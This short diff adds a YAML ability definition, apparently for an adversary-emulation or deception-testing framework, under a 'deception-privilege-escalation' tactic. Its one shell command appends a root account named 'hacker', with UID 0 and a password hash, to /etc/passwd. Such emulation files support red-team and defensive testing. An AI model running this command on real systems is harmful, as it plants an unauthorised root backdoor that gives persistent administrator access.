@@ -1,0 +1,15 @@
+---
+- id: deception-user-add
+  name: Add root user to /etc/passwd
+  description: add new credential to /etc/passwd
+  tactic: deception-privilege-escalation
+  technique:
+    attack_id: T9000
+    name: 'Deception'
+  repeatable: True
+  platforms:
+    linux:
+      sh:
+        command: 'echo ''hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash'' >>/etc/passwd'
+        cleanup:
+        parsers: []
